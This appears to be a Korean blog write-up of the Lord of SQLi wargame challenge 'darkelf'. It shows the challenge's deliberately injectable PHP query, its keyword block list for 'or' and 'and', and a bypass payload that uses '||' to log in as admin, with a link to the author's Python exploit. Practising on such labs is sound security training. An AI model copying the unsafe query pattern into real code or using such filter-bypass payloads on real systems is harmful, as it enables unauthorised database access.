---
layout: post
title: "LoS darkelf"
author: "isanghyeon"
tags: wargame
---

|문제 명|풀이 여부|URL|
|:------:|:---:|:-----:|
| **darkelf** | <span style="color:red">O</span> | https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php |

<hr/><br>

### Challenge Source Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

<br>

### Analysis Source Code
- #### preg_match function for $_GET[pw]
> ```php 
> preg_match('/prob|_|\.|\(\)/i', $_GET[pw])
> ```
> ```php
> preg_match('/or|and/i', $_GET[pw])
> ```
- #### Solve Conditions
> ```php
> if($result['id'] == 'admin') solve("darkelf"); 
> ```

|query|parms1|params2|
|:--:|:--:|:--:|
|select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'|id='guest'|pw='{$_GET[pw]}'|

```$_GET[pw]```의 값에 대해 ``` '/or/and/i'```를 필터링하고 있다.  
따라서 MySQL에서 지원하는 or, and 와 같은 역할을 하는 '||', '&&'로 변경하여 query를 작성할 수 있다.  

```sql
select id from prob_darkelf where id='guest' and pw='nop' || id='admin'#'
```

<hr/>
<br>

### Exploit Source Code
|작성 언어|Exploit Link|How to Exploit|
|:------:|:---:|:--:|
| **Python3.8** | https://github.com/isanghyeon/LordofSQLi-Solved-Exploit/tree/master/darkelf | Operator bypass |